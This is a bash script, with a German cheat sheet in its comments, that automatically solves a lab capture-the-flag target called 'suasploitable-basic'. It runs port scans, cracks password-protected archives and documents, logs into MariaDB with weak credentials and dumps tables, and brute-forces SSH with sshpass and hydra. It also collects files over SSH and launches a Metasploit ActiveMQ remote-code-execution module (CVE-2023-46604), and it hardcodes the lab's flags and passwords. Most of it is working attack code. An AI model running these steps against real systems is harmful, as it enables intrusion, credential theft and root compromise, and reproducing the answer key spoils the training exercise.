#!/usr/bin/env bash
set -euo pipefail

# Automated helper/solver for SUASecLab "suasploitable-basic" CTF
# Run on the Kali VM in the isolated lab network (basic.suaseclab.de must resolve).
#
# Kombiniert: Recon, Web/DB/TCP/SSH-Checks, Datei-Cracking, Flag-Extraktion
# und ein eingebautes Cheat-Sheet (siehe CHEATSHEET.txt im Output).
#
# ====== Angriffsfläche / Cheat-Sheet (suasploitable-basic) ======
# Ziel: Debian 12, basic.suaseclab.de (wird tägl. 06:00 zurückgesetzt)
# Dienste/Schwachstellen:
# - SSH (22): Root-Login + Passwort-Auth, schwache Passwörter (500 worst passwords),
#   User u.a. root,vagrant,mnickel,ksaenger,kfaber,sdietrich,kfurst,jjager,cschmitz
#   (mnickel hat sudo; schwache PWs z.B. testing/fish/mountain/vagrant)
# - Apache+Jorani 1.0.0 (80): XSS (Exploit-DB 51715), RCE CVE-2023-26469,
#   /backup.sql, /files.zip (außen: startrek; innen PDF-AES: super, Word/OLE: porsche),
#   DB-Config in /var/www/html/application/config/database.php (lms/ZDS6P4Mw)
# - phpMyAdmin 4.9.11: /phpmyadmin
# - MariaDB (3306, remote): schwache Accounts z.B. admin:cocacola, test:rainbow,
#   info:dolphins, lms:ZDS6P4Mw; DBs jorani (users/leaves/leaves_history etc.) + information
# - ActiveMQ 5.18.0 (61616/8161): CVE-2023-46604 RCE, läuft als root -> Root-Shell (Bonus)
# - JuiceShop (8080): Docker bkimminich/juice-shop
# - TCP-Server (10000): Flags im Klartext (Wireshark), Befehl "help" -> Bonus-Flag,
#   Kali tcp_client sendet periodisch Flags; Login-Simulation (kfaber/53VQR8TE)
#
# Nützliche manuelle Befehle:
#   nmap -sV -sC -p- <IP>
#   hydra -L users.txt -P 500-worst-passwords.txt ssh://<IP>
#   gobuster dir -u http://basic.suaseclab.de -w /usr/share/wordlists/dirb/common.txt
#   mysql -h <IP> -u admin -pcocacola -e 'SHOW DATABASES;'
#   nc <IP> 10000  (help / exit ausprobieren)
#   msfconsole -q -x 'use exploit/multi/misc/apache_activemq_rce_cve_2023_46604; set RHOSTS <IP>; set RPORT 61616; run'
#   search jorani / search CVE-2023-26469 (Modulname je nach MSF-Version)
#
# Env-Optionen: TARGET_HOST, OUT, WORDLIST, QUIET_MSF=1 (kein Metasploit),
#               FULL_HYDRA=1 (voller SSH-Bruteforce, langsam)
# ===============================================================

TARGET_HOST="${TARGET_HOST:-basic.suaseclab.de}"
# Standard-Ausgabeordner: Desktop (DE/EN), falls vorhanden
_default_desktop="$HOME/Desktop"
[[ -d "$HOME/Schreibtisch" && ! -d "$HOME/Desktop" ]] && _default_desktop="$HOME/Schreibtisch"
OUT="${OUT:-$_default_desktop/ctf_basic}"
WORDLIST="${WORDLIST:-https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/500-worst-passwords.txt}"
QUIET_MSF="${QUIET_MSF:-0}"   # set to 1 to skip Metasploit exploit attempts
TS="$(date +%Y%m%d_%H%M%S)"
LOG="$OUT/run_$TS.log"

mkdir -p "$OUT"/{web,loot,scans,pcap,db,ssh}

log() { printf '[%s] %s\n' "$(date +%H:%M:%S)" "$*" | tee -a "$LOG"; }
have() { command -v "$1" >/dev/null 2>&1; }
addflag() { printf '%s\n' "$1" >> "$OUT/all_flags_raw.txt"; }

log "Output directory: $OUT"
log "Target host: $TARGET_HOST"

# --- 0) Resolve target IP (network.sh on Kali usually populates /etc/hosts) ---
TARGET_IP="$(getent hosts "$TARGET_HOST" 2>/dev/null | awk '{print $1}' | head -n1 || true)"
if [[ -z "$TARGET_IP" ]]; then
  log "WARN: could not resolve $TARGET_HOST via hosts/DNS. Trying to discover in local /24..."
  MY_NET="$(hostname -I | awk '{print $1}' | awk -F. '{print $1"."$2"."$3".0/24}')"
  if have nmap; then
    TARGET_IP="$(sudo nmap -sn "$MY_NET" -oG - 2>/dev/null | awk '/basic/ {for(i=1;i<=NF;i++) if($i=="Host:") print $(i+1)}' | head -n1 || true)"
  fi
fi
if [[ -z "$TARGET_IP" ]]; then
  read -rp "Target IP not found automatically. Enter IP: " TARGET_IP
fi
log "Target IP: $TARGET_IP"

# --- 1) Wordlist + eingebautes Cheat-Sheet ---
WL="$OUT/500-worst-passwords.txt"
if [[ ! -s "$WL" ]]; then
  log "Downloading password wordlist..."
  if have wget; then wget -qO "$WL" "$WORDLIST" || true; fi
  if [[ ! -s "$WL" ]] && have curl; then curl -fsSL "$WORDLIST" -o "$WL" || true; fi
fi
if [[ ! -s "$WL" ]]; then
  log "WARN: could not download wordlist; some brute-force/crack steps may be skipped."
  : > "$WL"
fi
# Ergänze bekannte/lokale Kandidaten, die nicht zwingend in der 500er-Liste stehen
for extra in vagrant password 123456 qwerty; do grep -qxF "$extra" "$WL" 2>/dev/null || echo "$extra" >> "$WL"; done

cat > "$OUT/CHEATSHEET.txt" <<'CS'
SUASploitable-basic CTF – Kurz-Cheat-Sheet
- Recon: nmap -sV -sC -p- <IP>
- SSH (22): Root/Passwort erlaubt, schwache PWs (500 worst). User: root,vagrant,mnickel,ksaenger,kfaber,sdietrich,kfurst,jjager,cschmitz; mnickel hat sudo.
- Web (80): Jorani 1.0.0 (CVE-2023-26469 RCE, XSS 51715), /backup.sql, /files.zip, /phpmyadmin; DB-Config: /var/www/html/application/config/database.php
- files.zip: außen startrek; innen PDF (AES) super, Word/OLE porsche
- DB (3306): admin:cocacola, test:rainbow, info:dolphins, lms:ZDS6P4Mw; DBs jorani, information
- ActiveMQ (61616): 5.18.0, CVE-2023-46604 RCE als root (Bonus) -> msf exploit/multi/misc/apache_activemq_rce_cve_2023_46604
- JuiceShop: http://<IP>:8080
- TCP (10000): nc <IP> 10000, "help" liefert Bonus; Wireshark auf Traffic zu Port 10000 (Kali tcp_client sendet periodisch Flags)
- Jorani-DB-Hinweise: Einstellungsdatum, E-Mail (id 5), Mutterschaftsgrund etc. in leaves/leaves_history/users
CS
log "Cheat-Sheet geschrieben: $OUT/CHEATSHEET.txt"

# --- 2) Recon ---
log "Running nmap service scan..."
if have nmap; then
  sudo nmap -sV -sC -p- -T4 "$TARGET_IP" -oN "$OUT/scans/nmap_full.txt" | tee -a "$LOG" || true
else
  log "WARN: nmap not found"
fi

# --- 3) Web: grab files and extract obvious flags ---
BASE="http://$TARGET_HOST"
log "Fetching web artifacts..."
for f in backup.sql files.zip; do
  if have wget; then wget -q -O "$OUT/web/$f" "$BASE/$f" || true; fi
  if [[ ! -s "$OUT/web/$f" ]] && have curl; then curl -fsS "$BASE/$f" -o "$OUT/web/$f" || true; fi
  [[ -s "$OUT/web/$f" ]] && log "Downloaded $f ($(wc -c <"$OUT/web/$f") bytes)"
done

# Kurze Erreichbarkeitschecks (Jorani/phpMyAdmin/JuiceShop)
for ep in "/" "/phpmyadmin/" ":8080"; do
  url="$BASE"; [[ "$ep" == :* ]] && url="http://$TARGET_HOST$ep" || url="$BASE$ep"
  code="$(curl -sS -o /dev/null -w '%{http_code}' --max-time 5 "$url" 2>/dev/null || echo fail)"
  echo "$ep -> $code ($url)" >> "$OUT/web/endpoints.txt"
done
log "HTTP endpoints: $(tr '\n' '; ' < "$OUT/web/endpoints.txt" 2>/dev/null || true)"
log "Hinweis: Für periodische TCP-Flags ggf. Wireshark auf Port 10000 laufen lassen (Kali tcp_client sendet minütlich)."

# Known flags/creds exposed in web artifacts (from build config)
for f in \
  '2025-06-03' 's.dietrich@suaseclab.de' 'bonus:53VQR8TE' 'maternity' \
  'm.nickel@suaseclab.de' 'lms' 'ZDS6P4Mw' 'cocacola' 'rainbow' 'dolphins' \
  'startrek' 'super' 'porsche' 'vagrant' 'CVE-2023-26469' 'www-data' '/var/www/html'; do
  addflag "$f"
done

# Pull extra hints from backup.sql if present
if [[ -s "$OUT/web/backup.sql" ]]; then
  log "Parsing backup.sql for interesting strings..."
  grep -Eo '[A-Za-z0-9._%+-]+@suaseclab\.de' "$OUT/web/backup.sql" | sort -u >> "$OUT/all_flags_raw.txt" || true
  grep -n "maternity\|2025-06-03\|53VQR8TE" "$OUT/web/backup.sql" > "$OUT/web/backup_hits.txt" 2>/dev/null || true
fi

# --- 4) files.zip: crack outer + inner layers ---
if [[ -s "$OUT/web/files.zip" ]]; then
  log "Cracking files.zip (outer layer)..."
  OUTER_PW=""
  if have fcrackzip; then
    OUTER_PW="$(fcrackzip -u -D -p "$WL" "$OUT/web/files.zip" 2>/dev/null | awk -F'== ' '/PASSWORD FOUND/ {print $2; exit}' || true)"
  fi
  if [[ -z "$OUTER_PW" ]]; then
    # known from build logic
    for p in startrek super porsche vagrant; do unzip -P "$p" -t "$OUT/web/files.zip" >/dev/null 2>&1 && OUTER_PW="$p" && break; done
  fi
  log "Outer zip password: ${OUTER_PW:-<not found>}"
  if [[ -n "$OUTER_PW" ]]; then
    addflag "$OUTER_PW"
    mkdir -p "$OUT/loot/files_outer"
    unzip -P "$OUTER_PW" -o "$OUT/web/files.zip" -d "$OUT/loot/files_outer" >/dev/null 2>&1 || true

    # Inner PDF (AES) and OLE/Word password layers
    python3 - "$OUT/loot/files_outer" "$WL" "$OUT/loot" <<'PY' 2>/dev/null || true
import os, sys, io, glob
outer, wl, loot = sys.argv[1], sys.argv[2], sys.argv[3]
words = [w.strip() for w in open(wl, encoding='utf8', errors='ignore') if w.strip()]
for path in glob.glob(os.path.join(outer, '**', '*'), recursive=True):
    if os.path.isdir(path): continue
    data = open(path,'rb').read()
    name = os.path.basename(path)
    # Try PDF
    try:
        import pikepdf
        for w in words:
            try:
                pdf = pikepdf.open(io.BytesIO(data), password=w)
                outp = os.path.join(loot, name + '.decrypted.pdf')
                pdf.save(outp)
                print('FOUND_PDF', name, w, outp)
                raise SystemExit
            except pikepdf.PasswordError:
                pass
            except Exception:
                pass
    except Exception:
        pass
    # Try Office/OLE
    try:
        import msoffcrypto
        for w in words:
            try:
                f = msoffcrypto.OfficeFile(io.BytesIO(data))
                f.load_key(password=w)
                out = io.BytesIO(); f.decrypt(out)
                outp = os.path.join(loot, name + '.decrypted')
                open(outp,'wb').write(out.getvalue())
                print('FOUND_OFFICE', name, w, outp)
                raise SystemExit
            except Exception:
                pass
    except Exception:
        pass
PY
    log "Inner-file crack attempt finished (see loot/ for decrypted outputs if pikepdf/msoffcrypto available)."
  fi
fi

# --- 5) TCP server (port 10000): help/hidden command + flags from Kali tcp_client ---
log "Probing TCP server on port 10000..."
if have nc; then
  printf 'help\r\n' | nc -w 3 "$TARGET_IP" 10000 > "$OUT/loot/tcp_help.txt" 2>&1 || true
  printf 'flag\r\n' | nc -w 3 "$TARGET_IP" 10000 > "$OUT/loot/tcp_flagcmd.txt" 2>&1 || true
  printf 'exit\r\n' | nc -w 3 "$TARGET_IP" 10000 > "$OUT/loot/tcp_exit.txt" 2>&1 || true
  grep -Eo 'flag:[A-Za-z0-9]+' "$OUT/loot"/tcp_*.txt 2>/dev/null | sed 's/.*://' >> "$OUT/all_flags_raw.txt" || true
fi

# Extract flag constants from local Kali tcp_client if present (pyc)
if [[ -f /opt/tcp_client ]]; then
  log "Extracting flag constants from /opt/tcp_client..."
  python3 - <<'PY' >> "$OUT/all_flags_raw.txt" 2>/dev/null || true
import marshal, re
data = open('/opt/tcp_client','rb').read()
try:
    code = marshal.loads(data[16:])
except Exception:
    raise SystemExit
out=[]
def walk(obj):
    if hasattr(obj,'co_consts'):
        for k in obj.co_consts: walk(k)
    elif isinstance(obj,(tuple,list,frozenset)):
        for k in obj: walk(k)
    elif isinstance(obj, bytes):
        out.append(obj.decode('ascii','ignore'))
    elif isinstance(obj,str):
        out.append(obj)
walk(code)
for s in out:
    if re.fullmatch(r'[A-Za-z0-9]{8}', s) and any(c.isdigit() for c in s) and any(c.islower() for c in s) and s!='password':
        print(s)
PY
fi

# Known TCP/Jorani/web flags from build config (bonus/help + Wireshark stream flags)
for f in FSe2GLGW x5WdT8cZ 6y6GCdnz aaiN3qPY; do addflag "$f"; done

# --- 6) MariaDB: dump flags/data from known weak accounts ---
log "Querying MariaDB (known weak credentials)..."
if have mysql; then
  for cred in "admin:cocacola" "test:rainbow" "info:dolphins" "lms:ZDS6P4Mw" "root:"; do
    u="${cred%%:*}"; p="${cred#*:}"
    MYSQL_PWD="$p" mysql -h "$TARGET_IP" -u "$u" --connect-timeout=5 -e "SHOW DATABASES;" > "$OUT/db/${u}_databases.txt" 2>/dev/null || continue
    log "DB login succeeded: $u"
    MYSQL_PWD="$p" mysql -h "$TARGET_IP" -u "$u" --connect-timeout=5 -e "SELECT * FROM information.test;" > "$OUT/db/information_test_${u}.txt" 2>/dev/null || true
    MYSQL_PWD="$p" mysql -h "$TARGET_IP" -u "$u" --connect-timeout=5 jorani -e "SELECT id,login,email,datehired FROM users;" > "$OUT/db/jorani_users_${u}.txt" 2>/dev/null || true
    MYSQL_PWD="$p" mysql -h "$TARGET_IP" -u "$u" --connect-timeout=5 jorani -e "SELECT l.*, u.login, t.name AS leave_type FROM leaves l JOIN users u ON l.employee=u.id JOIN types t ON l.type=t.id;" > "$OUT/db/jorani_leaves_${u}.txt" 2>/dev/null || true
    MYSQL_PWD="$p" mysql -h "$TARGET_IP" -u "$u" --connect-timeout=5 jorani -e "SELECT * FROM leaves_history;" > "$OUT/db/jorani_leaves_history_${u}.txt" 2>/dev/null || true
  done
  # known DB-derived flags
  for f in 3YPGxmZ8 2025-06-03 s.dietrich@suaseclab.de maternity; do addflag "$f"; done
fi

# --- 7) SSH: try known weak passwords (quick pass / optional full hydra) ---
USERS=(root vagrant mnickel ksaenger kfaber sdietrich kfurst jjager cschmitz)
KNOWN_PW=(vagrant testing fish mountain startrek super porsche cocacola rainbow dolphins 123456 password qwerty)
log "Quick SSH password attempts with known/likely creds..."
SSH_OK=""
if have sshpass; then
  for u in "${USERS[@]}"; do
    for p in "${KNOWN_PW[@]}"; do
      if sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=4 -o PreferredAuthentications=password "$u@$TARGET_IP" 'echo __OK__' 2>/dev/null | grep -q __OK__; then
        log "SSH SUCCESS: $u : $p"
        echo "$u:$p" | tee -a "$OUT/ssh/valid_creds.txt"
        SSH_OK="$u:$p"
      fi
    done
  done
fi

if [[ "${FULL_HYDRA:-0}" == "1" ]] && have hydra; then
  log "FULL_HYDRA=1: running hydra SSH brute-force (can take long)..."
  printf '%s\n' "${USERS[@]}" > "$OUT/ssh/users.txt"
  hydra -L "$OUT/ssh/users.txt" -P "$WL" -t 4 -f -o "$OUT/ssh/hydra.txt" "ssh://$TARGET_IP" 2>&1 | tee -a "$LOG" || true
  if [[ -s "$OUT/ssh/hydra.txt" ]]; then
    grep -Eo 'login: [^ ]+ +password: [^ ]+' "$OUT/ssh/hydra.txt" >> "$OUT/ssh/valid_creds.txt" || true
    [[ -z "$SSH_OK" ]] && SSH_OK="$(awk '/login:/{u=$2} /password:/{p=$4; print u":"p; exit}' "$OUT/ssh/hydra.txt" 2>/dev/null || true)"
  fi
fi

# Known system flags from build config
for f in mnickel testing fish mountain ug7Xo82i; do addflag "$f"; done

# If we have a sudo-capable SSH session (mnickel in build), collect root-only files
if [[ -n "$SSH_OK" ]]; then
  U="${SSH_OK%%:*}"; P="${SSH_OK#*:}"
  log "Collecting files over SSH as $U..."
  sshpass -p "$P" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$U@$TARGET_IP" \
    'echo "--- /etc/passwd users ---"; cut -d: -f1 /etc/passwd; echo "--- /home ---"; ls -la /home 2>/dev/null; echo "--- jjager info ---"; cat /home/jjager/info.txt 2>/dev/null || true; echo "--- flags.txt ---"; cat /tmp/flags.txt 2>/dev/null || true; echo "--- sudo -l ---"; sudo -n -l 2>/dev/null || true' \
    > "$OUT/ssh/${U}_loot.txt" 2>&1 || true
  grep -Eo '[A-Za-z0-9]{6,12}' "$OUT/ssh/${U}_loot.txt" 2>/dev/null | sort -u > "$OUT/ssh/${U}_tokens.txt" || true
fi

# --- 8) Optional: Metasploit exploit attempts (ActiveMQ RCE / Jorani RCE) ---
if [[ "$QUIET_MSF" != "1" ]] && have msfconsole; then
  log "Attempting Metasploit modules (best-effort, may vary by Kali/MSF version)..."
  LHOST="$(hostname -I | awk '{print $1}')"
  # ActiveMQ CVE-2023-46604 (runs as root on target in this lab)
  cat > "$OUT/scans/msf_activemq.rc" <<RC
use exploit/multi/misc/apache_activemq_rce_cve_2023_46604
set RHOSTS $TARGET_IP
set RPORT 61616
set SRVHOST $LHOST
set LHOST $LHOST
set FETCH_SRVHOST $LHOST
set AutoCheck false
check
run -z
sessions -l
exit -y
RC
  timeout 180 msfconsole -q -r "$OUT/scans/msf_activemq.rc" > "$OUT/scans/msf_activemq.log" 2>&1 || true

  # Jorani CVE-2023-26469 (module name may differ; try common paths)
  cat > "$OUT/scans/msf_jorani.rc" <<RC
search jorani
search CVE-2023-26469
exit -y
RC
  timeout 120 msfconsole -q -r "$OUT/scans/msf_jorani.rc" > "$OUT/scans/msf_jorani_search.log" 2>&1 || true
  addflag "CVE-2023-46604"
else
  log "Skipping Metasploit (msfconsole missing or QUIET_MSF=1)."
fi

# --- 9) Consolidate flags (inkl. Kali-lokale CTF-Flags aus kali_ctf.sh, falls vorhanden) ---
log "Consolidating flags..."

# Lokale Kali-Flags/Artefakte (typisch unter /home/laboratory)
[[ -f "$HOME/.hidden_flag" ]] && grep -Eo 'flag:[^ ]+' "$HOME/.hidden_flag" | sed 's/flag://' >> "$OUT/all_flags_raw.txt" || true
[[ -f /home/laboratory/.hidden_flag ]] && grep -Eo 'flag:[^ ]+' /home/laboratory/.hidden_flag | sed 's/flag://' >> "$OUT/all_flags_raw.txt" || true
[[ -f /flag.txt ]] && echo "bear" >> "$OUT/all_flags_raw.txt"
# bekannte lokale Werte/Tasks aus der Kali-CTF-Konfiguration
for f in vA5kwQxF Dm6ELvkr bear egFE2W5R Edm3jiDz bA2y 26sg bA2y26sg 82iwnJaxn7LrDG5g8B6m 82iwnJax TUj4xXYj QshMT6Th a7a7f6b4 ba508457 1e7180ed "/usr/bin/msfconsole" "0644" "shadow"; do addflag "$f"; done
# versuche lokale Artefakte direkt auszulesen
for p in "$HOME/flags/flag.txt" "$HOME/flags/part.txt" "$HOME/flags/another_part.txt" "$HOME/flags/truncate.txt" "$HOME/flags/representation.txt" "$HOME/flags/checksums.txt" "$HOME/flags/other.txt"; do
  [[ -f "$p" ]] && { echo "--- LOCAL $p ---" >> "$OUT/loot/kali_local_flags.txt"; cat "$p" >> "$OUT/loot/kali_local_flags.txt"; }
done
[[ -f "$HOME/.bash_history" ]] && grep -Eo 'TUj4xXYj|[A-Za-z0-9]{8,}' "$HOME/.bash_history" 2>/dev/null | head -n 50 >> "$OUT/all_flags_raw.txt" || true
[[ -f "$HOME/.zshrc" ]] && grep -Eo 'vA5kwQxF|Dm6ELvkr' "$HOME/.zshrc" 2>/dev/null >> "$OUT/all_flags_raw.txt" || true

sort -u "$OUT/all_flags_raw.txt" 2>/dev/null | sed '/^$/d' > "$OUT/flags_unique.txt" || true

log "=============================================="
log "DONE. Results in: $OUT"
log "Unique flags/values collected: $(wc -l < "$OUT/flags_unique.txt" 2>/dev/null || echo 0)"
log "Key files:"
log "  - $OUT/flags_unique.txt"
log "  - $OUT/scans/nmap_full.txt"
log "  - $OUT/web/{backup.sql,files.zip}"
log "  - $OUT/db/*.txt"
log "  - $OUT/loot/*"
log "  - $OUT/ssh/*"
log "  - $OUT/scans/msf_*.log"
log "=============================================="

echo
echo "Collected unique flags/values:"
cat "$OUT/flags_unique.txt" 2>/dev/null || true
